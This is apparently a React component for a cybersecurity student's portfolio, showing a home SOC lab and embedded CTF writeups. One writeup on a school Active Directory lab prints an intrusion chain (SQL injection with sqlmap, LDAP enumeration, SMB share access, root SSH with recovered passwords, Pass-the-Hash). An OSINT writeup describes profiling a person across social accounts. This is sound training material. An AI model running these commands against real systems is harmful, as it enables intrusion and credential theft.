'use client'

import { useState } from 'react'
import { Github, ExternalLink, Flag, Eye, BookOpen, Server, Shield, Network, Cpu, HardDrive, Lock, Activity, Ban } from 'lucide-react'
import THMStats from '@/components/THMStats'
import WriteupModal from '@/components/WriteupModal'

// ============ LAB DATA ============
const labComponents = [
  {
    name: 'SIEM - Wazuh',
    description: 'Solution SIEM open source pour la détection et l\'analyse des menaces',
    icon: Shield,
    status: 'running',
    specs: [
      'Wazuh Manager (analyse des logs)',
      'Wazuh Indexer (stockage)',
      'Wazuh Dashboard (visualisation)',
      'Agents déployés sur VMs',
    ],
  },
  {
    name: 'IDS/IPS - Suricata',
    description: 'Détection d\'intrusion réseau avec règles Emerging Threats',
    icon: Eye,
    status: 'running',
    specs: [
      '47 000+ règles ET chargées',
      'Intégration Wazuh (eve.json)',
      'Détection réseau temps réel',
      'Mapping MITRE ATT&CK',
    ],
  },
  {
    name: 'Hyperviseur - Proxmox',
    description: 'Virtualisation des machines pour l\'infrastructure SOC',
    icon: Server,
    status: 'running',
    specs: [
      'Multi-VMs de lab',
      'Réseau NAT isolé',
      'Stockage LVM',
      'Snapshots & backups',
    ],
  },
]

const securityMeasures = [
  {
    name: 'SSH Hardening',
    description: 'Authentification sécurisée et accès restreint',
    icon: Lock,
    status: 'active',
    details: ['Clés ██████████ uniquement', 'Port ████', 'Root login [DISABLED]', 'AllowUsers [REDACTED]'],
  },
  {
    name: 'Anti-Bruteforce',
    description: 'Protection automatique contre les attaques',
    icon: Ban,
    status: 'active',
    details: ['Fail2ban actif', '150+ IPs bannies', 'Monitoring actif', 'Alertes temps réel'],
  },
  {
    name: 'Monitoring SOC',
    description: 'Surveillance centralisée et corrélation',
    icon: Activity,
    status: 'active',
    details: ['Logs centralisés', 'IDS/IPS alerts', 'MITRE ATT&CK', 'Vuln scanning'],
  },
]

const labMetrics = [
  { label: 'Alertes/jour', value: '100+', icon: Activity, color: 'cyber-green' },
  { label: 'IPs bloquées', value: '150+', icon: Ban, color: 'red-400' },
  { label: 'Règles IDS', value: '47k+', icon: Eye, color: 'cyber-blue' },
  { label: 'VMs actives', value: '3+', icon: Server, color: 'purple-400' },
]

// ============ WRITEUPS DATA ============
const writeups = [
  {
    title: 'Pentest Active Directory',
    platform: 'Lab Ynov',
    difficulty: 'Hard',
    tags: ['AD', 'SQLi', 'LDAP', 'SMB', 'Pentest'],
    date: '2025',
    category: 'Pentest',
    description: 'Compromission complète d\'un domaine AD : de l\'injection SQL au contrôle total',
    content: [
      { type: 'heading', text: 'Cible' },
      { type: 'text', text: 'Machine eval.lan (192.168.46.128) - Environnement Active Directory' },
      { type: 'heading', text: '1. Reconnaissance' },
      { type: 'text', text: 'Scan nmap pour identifier les services ouverts sur la cible.' },
      { type: 'code', text: 'nmap -sV 192.168.46.128\n\nPorts découverts:\n- SSH (22)\n- Kerberos (88)\n- MSRPC (135)\n- LDAP (389)\n- SMB (445)' },
      { type: 'heading', text: '2. Injection SQL' },
      { type: 'text', text: 'Utilisation de SQLMap sur un champ de recherche vulnérable sur la page principale du site.' },
      { type: 'code', text: 'sqlmap -u "http://target/search?q=test" --dbs\n\nCredentials extraits:\n→ ldap_reader : Reader123!' },
      { type: 'heading', text: '3. Énumération LDAP' },
      { type: 'text', text: 'Avec les credentials ldap_reader, énumération des utilisateurs du domaine.' },
      { type: 'code', text: 'ldapsearch -x -H ldap://192.168.46.128 \\\n  -D "ldap_reader@eval.lan" -w \'Reader123!\' \\\n  -b "DC=eval,DC=lan" "(objectClass=user)" \\\n  cn sAMAccountName info description' },
      { type: 'text', text: 'Le champ "description" indique "temp password = firstname + year" mais c\'est un piège. Le vrai indice est dans le champ "info" encodé en Base64.' },
      { type: 'heading', text: '4. Décodage Base64' },
      { type: 'text', text: 'L\'utilisateur svc-itops a une valeur différente dans le champ info.' },
      { type: 'code', text: 'echo \'V2ludGVyMjAyNCE=\' | base64 -d\n→ Winter2024!\n\nCredentials: svc-itops / Winter2024!' },
      { type: 'heading', text: '5. Accès SMB' },
      { type: 'text', text: 'Test des credentials sur les partages SMB.' },
      { type: 'code', text: 'netexec smb 192.168.46.128 -u \'svc-itops\' \\\n  -p \'Winter2024!\' -d eval.lan --shares\n\n→ Accès READ,WRITE sur "Fileshare"' },
      { type: 'heading', text: '6. Exploration Fileshare' },
      { type: 'code', text: 'smbclient //192.168.46.128/Fileshare \\\n  -U \'svc-itops%Winter2024!\'\n\nsmb> get Pass.txt\n\nContenu: ADDC : root / yboost_ezyeval2026' },
      { type: 'heading', text: '7. Accès Root - Domain Compromis' },
      { type: 'code', text: 'ssh root@192.168.46.128\nPassword: yboost_ezyeval2026\n\n→ DOMAINE COMPROMIS' },
      { type: 'heading', text: 'Kill Chain' },
      { type: 'code', text: 'SQLi → ldap_reader:Reader123!\n  ↓\nÉnumération LDAP → Champ info Base64\n  ↓\nDécodage → svc-itops:Winter2024!\n  ↓\nSMB Fileshare → Pass.txt\n  ↓\nSSH root → DOMAINE COMPROMIS' },
      { type: 'heading', text: 'Bonus: Pass-the-Hash' },
      { type: 'text', text: 'Extraction du hash NTLM Administrator et validation du contrôle total via Pass-the-Hash.' },
      { type: 'heading', text: 'Compétences' },
      { type: 'list', items: [
        'Injection SQL et extraction de données',
        'Énumération LDAP Active Directory',
        'Analyse et décodage Base64',
        'Exploitation SMB et partages réseau',
        'Élévation de privilèges',
        'Pass-the-Hash (PTH)',
      ]},
    ],
  },
  {
    title: 'KillCleaner',
    platform: 'CTF YNOV 25',
    difficulty: 'Easy',
    tags: ['OSINT', 'Twitter', 'Vinted', 'Social Engineering'],
    date: '2025',
    category: 'OSINT',
    description: 'Challenge OSINT - Retrouver des informations sur un profil à partir de son pseudo',
    content: [
      { type: 'heading', text: 'Énoncé' },
      { type: 'text', text: 'On nous donne un pseudo "@killcleaner" et on doit retrouver des informations sur cette personne.' },
      { type: 'heading', text: 'Résolution' },
      { type: 'text', text: 'Première étape : recherche du pseudo sur les réseaux sociaux. On trouve un compte Twitter avec ce pseudo.' },
      { type: 'text', text: 'En analysant les tweets, on trouve une référence à un compte Vinted. Sur Vinted, le profil révèle plus d\'informations personnelles.' },
      { type: 'code', text: 'Pseudo Twitter: @killcleaner\nCompte Vinted trouvé via bio Twitter\nLocalisation mentionnée dans les annonces' },
      { type: 'heading', text: 'Flag' },
      { type: 'flag', text: 'MUSIC{REDACTED}' },
      { type: 'heading', text: 'Compétences' },
      { type: 'list', items: [
        'Recherche OSINT multi-plateformes',
        'Analyse de profils sociaux',
        'Corrélation d\'informations entre sources',
        'Techniques de doxing éthique',
      ]},
    ],
  },
  {
    title: '2HOLD2HANDLE',
    platform: 'CTF YNOV 25',
    difficulty: 'Medium',
    tags: ['Crypto', 'Stegano', 'Misc'],
    date: '2025',
    category: 'Misc',
    description: 'Challenge combinant plusieurs techniques pour récupérer le flag',
    content: [
      { type: 'heading', text: 'Énoncé' },
      { type: 'text', text: 'Un fichier mystérieux nous est fourni. À nous de trouver ce qu\'il cache.' },
      { type: 'heading', text: 'Résolution' },
      { type: 'text', text: 'Analyse du fichier avec différents outils pour identifier le type de données cachées.' },
      { type: 'code', text: '# Commandes utilisées\nfile mystery.bin\nstrings mystery.bin\nbinwalk mystery.bin' },
      { type: 'heading', text: 'Flag' },
      { type: 'flag', text: 'MUSIC{REDACTED}' },
      { type: 'heading', text: 'Compétences' },
      { type: 'list', items: [
        'Analyse de fichiers binaires',
        'Stéganographie',
        'Décodage multi-formats',
      ]},
    ],
  },
  {
    title: 'Factz',
    platform: 'CTF YNOV 25',
    difficulty: 'Easy',
    tags: ['Web', 'OSINT', 'Recon'],
    date: '2025',
    category: 'Web/OSINT',
    description: 'Challenge de reconnaissance et collecte d\'informations',
    content: [
      { type: 'heading', text: 'Énoncé' },
      { type: 'text', text: 'Un site web nous est donné. Il faut collecter des informations pour reconstituer le flag.' },
      { type: 'heading', text: 'Résolution' },
      { type: 'text', text: 'Exploration du site et de ses métadonnées pour trouver les indices cachés.' },
      { type: 'heading', text: 'Flag' },
      { type: 'flag', text: 'MUSIC{REDACTED}' },
      { type: 'heading', text: 'Compétences' },
      { type: 'list', items: [
        'Reconnaissance web',
        'Analyse de code source',
        'Collecte d\'informations',
      ]},
    ],
  },
  {
    title: 'decisnotdec',
    platform: 'CTF YNOV 25',
    difficulty: 'Medium',
    tags: ['Crypto', 'Encoding', 'Reverse'],
    date: '2025',
    category: 'Crypto',
    description: 'Challenge de décodage et cryptanalyse',
    content: [
      { type: 'heading', text: 'Énoncé' },
      { type: 'text', text: 'Une chaîne de caractères encodée nous est fournie. Le titre suggère que le décimal n\'est pas la solution.' },
      { type: 'heading', text: 'Résolution' },
      { type: 'text', text: 'Identification du bon encodage en testant différentes bases et formats.' },
      { type: 'code', text: '# Test différents encodages\necho "data" | base64 -d\necho "data" | xxd -r -p' },
      { type: 'heading', text: 'Flag' },
      { type: 'flag', text: 'MUSIC{REDACTED}' },
      { type: 'heading', text: 'Compétences' },
      { type: 'list', items: [
        'Identification d\'encodages',
        'Cryptanalyse basique',
        'Conversion entre bases numériques',
      ]},
    ],
  },
]

// ============ HELPERS ============
const getStatusColor = (status) => {
  const colors = {
    running: 'text-green-400 bg-green-400/10',
    active: 'text-green-400 bg-green-400/10',
    ready: 'text-yellow-400 bg-yellow-400/10',
  }
  return colors[status] || 'text-gray-400 bg-gray-400/10'
}

const getStatusText = (status) => {
  const texts = {
    running: '● Running',
    active: '● Active',
    ready: '○ Ready',
  }
  return texts[status] || '◌ Standby'
}

const getDifficultyColor = (diff) => {
  const colors = {
    Easy: 'text-green-400 bg-green-400/10 border-green-400/30',
    Medium: 'text-yellow-400 bg-yellow-400/10 border-yellow-400/30',
    Hard: 'text-red-400 bg-red-400/10 border-red-400/30',
    Insane: 'text-purple-400 bg-purple-400/10 border-purple-400/30',
  }
  return colors[diff] || colors.Easy
}

export default function VisitorHome() {
  const [selectedWriteup, setSelectedWriteup] = useState(null)

  return (
    <div className="space-y-8">
      {/* ============ HERO SECTION ============ */}
      <section id="top" className="bg-cyber-dark rounded-xl p-6 md:p-8 border border-cyber-green/20 scroll-mt-24">
        <div className="flex flex-col md:flex-row items-start justify-between gap-6">
          <div className="flex-1">
            <div className="flex items-center gap-3 mb-3">
              <span className="text-cyber-green font-mono text-lg">$</span>
              <h1 className="text-3xl font-bold text-white font-mono">Nathan Jupin</h1>
            </div>
            <p className="text-cyber-green/80 font-mono text-lg mb-4">
              Cybersecurity Student @ Ynov
            </p>
            <p className="text-gray-300 leading-relaxed mb-4">
              Étudiant B2 en cybersécurité. J&apos;administre un serveur dédié en production
              avec Wazuh et Suricata, et je développe mes compétences via CTF et projets concrets.
            </p>
            <div className="flex flex-wrap gap-2">
              <span className="px-3 py-1 bg-cyber-blue/10 text-cyber-blue text-sm rounded font-mono border border-cyber-blue/20">
                SOC / Wazuh
              </span>
              <span className="px-3 py-1 bg-cyber-green/10 text-cyber-green text-sm rounded font-mono border border-cyber-green/20">
                Pentest
              </span>
              <span className="px-3 py-1 bg-purple-500/10 text-purple-400 text-sm rounded font-mono border border-purple-500/20">
                Infra / VMs
              </span>
            </div>
          </div>
          <div className="w-full md:w-auto">
            <THMStats />
          </div>
        </div>
      </section>

      {/* ============ LAB SOC SECTION ============ */}
      <section id="lab" className="space-y-6 scroll-mt-24">
        <div className="bg-cyber-dark rounded-xl p-6 border border-cyber-green/20">
          <div className="font-mono">
            <p className="text-gray-500 mb-2">
              <span className="text-cyber-green">nathan@soc</span>:<span className="text-cyber-blue">~/lab</span>$ systemctl status wazuh-manager
            </p>
            <h2 className="text-2xl font-bold text-white mb-2">Mon Lab SOC</h2>
            <p className="text-gray-400">Infrastructure de sécurité sur serveur dédié</p>
          </div>
        </div>

        {/* Lab Metrics */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
          {labMetrics.map((metric, i) => (
            <div
              key={i}
              className="opacity-0 animate-[fadeSlideIn_0.5s_ease-out_forwards]"
              style={{ animationDelay: `${i * 100}ms` }}
            >
              <div className="bg-cyber-dark rounded-xl p-4 border border-gray-800 hover:border-cyber-green/30 transition-colors h-full">
                <div className="flex items-center gap-2 text-gray-400 text-xs mb-2">
                  <metric.icon className={`w-4 h-4 text-${metric.color}`} />
                  {metric.label}
                </div>
                <p className={`text-3xl font-bold font-mono text-${metric.color}`}>{metric.value}</p>
              </div>
            </div>
          ))}
        </div>

        {/* Lab Components */}
        <div>
          <h3 className="text-lg font-semibold text-white mb-4 font-mono flex items-center gap-2">
            <HardDrive className="w-5 h-5 text-cyber-green" />
            Composants du Lab
          </h3>
          <div className="grid md:grid-cols-3 gap-4">
            {labComponents.map((component, i) => (
              <div
                key={i}
                className="opacity-0 animate-[fadeSlideIn_0.5s_ease-out_forwards]"
                style={{ animationDelay: `${i * 100}ms` }}
              >
                <div className="bg-cyber-dark rounded-xl p-5 border border-gray-800 hover:border-cyber-green/30 transition-colors h-full">
                  <div className="flex items-start justify-between mb-3">
                    <component.icon className="w-8 h-8 text-cyber-green" />
                    <span className={`px-2 py-1 rounded text-xs font-mono ${getStatusColor(component.status)}`}>
                      {getStatusText(component.status)}
                    </span>
                  </div>
                  <h4 className="text-white font-semibold mb-2">{component.name}</h4>
                  <p className="text-gray-400 text-sm mb-4">{component.description}</p>
                  <div className="space-y-1">
                    {component.specs.map((spec, j) => (
                      <p key={j} className="text-gray-500 text-xs font-mono flex items-center gap-2">
                        <span className="text-cyber-green">▹</span>
                        {spec}
                      </p>
                    ))}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Security Measures */}
        <div>
          <h3 className="text-lg font-semibold text-white mb-4 font-mono flex items-center gap-2">
            <Lock className="w-5 h-5 text-cyber-blue" />
            Sécurisation
          </h3>
          <div className="grid md:grid-cols-3 gap-4">
            {securityMeasures.map((measure, i) => (
              <div
                key={i}
                className="opacity-0 animate-[fadeSlideIn_0.5s_ease-out_forwards]"
                style={{ animationDelay: `${(i + 3) * 100}ms` }}
              >
                <div className="bg-cyber-dark rounded-xl p-5 border border-gray-800 hover:border-cyber-blue/30 transition-colors h-full">
                  <div className="flex items-start justify-between mb-3">
                    <measure.icon className="w-6 h-6 text-cyber-blue" />
                    <span className={`px-2 py-1 rounded text-xs font-mono ${getStatusColor(measure.status)}`}>
                      {getStatusText(measure.status)}
                    </span>
                  </div>
                  <h4 className="text-white font-semibold mb-2">{measure.name}</h4>
                  <p className="text-gray-400 text-sm mb-3">{measure.description}</p>
                  <div className="space-y-1">
                    {measure.details.map((detail, j) => (
                      <p key={j} className="text-gray-500 text-xs font-mono flex items-center gap-2">
                        <span className="text-cyber-blue">→</span>
                        {detail}
                      </p>
                    ))}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* MITRE ATT&CK */}
        <div className="bg-cyber-dark rounded-xl p-6 border border-gray-800">
          <h3 className="text-lg font-semibold text-white mb-4 font-mono flex items-center gap-2">
            <Network className="w-5 h-5 text-cyber-green" />
            Détections MITRE ATT&CK
          </h3>
          <div className="flex flex-wrap gap-2">
            {[
              'Valid Accounts (T1078)',
              'Brute Force (T1110)',
              'SSH (T1021.004)',
              'Network Sniffing (T1040)',
              'Remote Services (T1021)',
              'System Information Discovery (T1082)',
            ].map((technique, i) => (
              <span
                key={i}
                className="px-3 py-1.5 bg-cyber-darker rounded-lg border border-gray-700 text-gray-300 text-xs font-mono"
              >
                {technique}
              </span>
            ))}
          </div>
        </div>

        {/* Infrastructure */}
        <div className="bg-cyber-dark rounded-xl p-6 border border-gray-800">
          <h3 className="text-lg font-semibold text-white mb-4 font-mono flex items-center gap-2">
            <Cpu className="w-5 h-5 text-cyber-blue" />
            Infrastructure
          </h3>
          <div className="grid md:grid-cols-3 gap-4 font-mono text-sm">
            <div className="bg-cyber-darker rounded-lg p-4">
              <p className="text-gray-500 mb-1">Serveur</p>
              <p className="text-white">Dédié hébergé</p>
              <p className="text-gray-500 text-xs">Multi-core / 64GB+ RAM</p>
            </div>
            <div className="bg-cyber-darker rounded-lg p-4">
              <p className="text-gray-500 mb-1">Virtualisation</p>
              <p className="text-white">Proxmox VE</p>
              <p className="text-gray-500 text-xs">Réseau isolé NAT</p>
            </div>
            <div className="bg-cyber-darker rounded-lg p-4">
              <p className="text-gray-500 mb-1">Monitoring</p>
              <p className="text-white">Wazuh + Suricata</p>
              <p className="text-gray-500 text-xs">24/7 actif</p>
            </div>
          </div>
        </div>
      </section>

      {/* ============ CTF WRITEUPS SECTION ============ */}
      <section id="writeups" className="space-y-6 scroll-mt-24">
        <div className="bg-cyber-dark rounded-xl p-6 border border-cyber-green/20">
          <div className="font-mono">
            <p className="text-gray-500 mb-2">
              <span className="text-cyber-green">nathan@kali</span>:<span className="text-cyber-blue">~/writeups</span>$ cat README.md
            </p>
            <h2 className="text-2xl font-bold text-white mb-2">CTF Writeups</h2>
            <p className="text-gray-400">Challenges résolus et documentés</p>
          </div>
        </div>

        {/* GitBook Link */}
        <div className="bg-gradient-to-r from-cyber-purple/10 to-cyber-blue/10 rounded-xl p-6 border border-cyber-purple/30">
          <div className="flex flex-col md:flex-row items-center gap-4">
            <BookOpen className="w-12 h-12 text-cyber-purple" />
            <div className="flex-1 text-center md:text-left">
              <h3 className="text-xl font-semibold text-white mb-1">GitBook - Documentation complète</h3>
              <p className="text-gray-400">
                Tous mes writeups détaillés sont disponibles sur mon GitBook
              </p>
            </div>
            <a
              href="https://metsam-notes.gitbook.io/ctf-ynov-25/"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center gap-2 px-6 py-3 bg-cyber-purple text-white font-semibold rounded-lg hover:bg-cyber-purple/80 transition-colors"
            >
              Accéder au GitBook
              <ExternalLink className="w-4 h-4" />
            </a>
          </div>
        </div>

        {/* Writeups List */}
        <div>
          <h3 className="text-lg font-semibold text-white mb-4 font-mono flex items-center gap-2">
            <Flag className="w-5 h-5 text-cyber-green" />
            CTF YNOV 25 - {writeups.length} writeups
          </h3>
          <div className="space-y-4">
            {writeups.map((writeup, i) => (
              <button
                key={i}
                onClick={() => setSelectedWriteup(writeup)}
                className="group block w-full bg-cyber-dark rounded-xl p-5 border border-gray-800 hover:border-cyber-purple/50 transition-all text-left"
              >
                <div className="flex flex-col md:flex-row md:items-center gap-4">
                  <div className="flex-1">
                    <div className="flex items-center gap-3 mb-2">
                      <h4 className="text-lg font-semibold text-white group-hover:text-cyber-purple transition-colors">
                        {writeup.title}
                      </h4>
                      <span className={`px-2 py-0.5 text-xs rounded border ${getDifficultyColor(writeup.difficulty)}`}>
                        {writeup.difficulty}
                      </span>
                    </div>
                    <p className="text-gray-400 text-sm mb-3">{writeup.description}</p>
                    <div className="flex flex-wrap items-center gap-3">
                      <span className="text-cyber-purple text-sm font-mono">{writeup.platform}</span>
                      <span className="text-gray-600">•</span>
                      <span className="text-gray-500 text-sm">{writeup.date}</span>
                      <span className="text-gray-600">•</span>
                      <div className="flex gap-2">
                        {writeup.tags.map((tag, j) => (
                          <span
                            key={j}
                            className="px-2 py-0.5 bg-gray-800 text-gray-400 text-xs rounded"
                          >
                            {tag}
                          </span>
                        ))}
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 text-gray-600 group-hover:text-cyber-purple transition-colors">
                    <Eye className="w-5 h-5" />
                    <span className="text-sm font-mono">Preview</span>
                  </div>
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Platforms */}
        <div className="grid md:grid-cols-3 gap-4">
          <a
            href="https://tryhackme.com/p/METSAM"
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-4 bg-cyber-dark rounded-xl p-5 border border-gray-800 hover:border-red-500/50 transition-colors"
          >
            <div className="p-3 bg-red-500/10 rounded-lg">
              <Flag className="w-6 h-6 text-red-500" />
            </div>
            <div>
              <p className="text-white font-semibold">TryHackMe</p>
              <p className="text-gray-400 text-sm">@METSAM</p>
            </div>
            <ExternalLink className="w-4 h-4 text-gray-600 ml-auto" />
          </a>

          <a
            href="https://hackthebox.com"
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-4 bg-cyber-dark rounded-xl p-5 border border-gray-800 hover:border-green-500/50 transition-colors"
          >
            <div className="p-3 bg-green-500/10 rounded-lg">
              <Flag className="w-6 h-6 text-green-500" />
            </div>
            <div>
              <p className="text-white font-semibold">HackTheBox</p>
              <p className="text-gray-400 text-sm">Profil HTB</p>
            </div>
            <ExternalLink className="w-4 h-4 text-gray-600 ml-auto" />
          </a>

          <a
            href="https://github.com/Metsamgit"
            target="_blank"
            rel="noopener noreferrer"
            className="flex items-center gap-4 bg-cyber-dark rounded-xl p-5 border border-gray-800 hover:border-cyber-green/50 transition-colors"
          >
            <div className="p-3 bg-cyber-green/10 rounded-lg">
              <Github className="w-6 h-6 text-cyber-green" />
            </div>
            <div>
              <p className="text-white font-semibold">GitHub</p>
              <p className="text-gray-400 text-sm">@Metsamgit</p>
            </div>
            <ExternalLink className="w-4 h-4 text-gray-600 ml-auto" />
          </a>
        </div>
      </section>

      {/* Modal */}
      <WriteupModal
        writeup={selectedWriteup}
        isOpen={!!selectedWriteup}
        onClose={() => setSelectedWriteup(null)}
      />
    </div>
  )
}
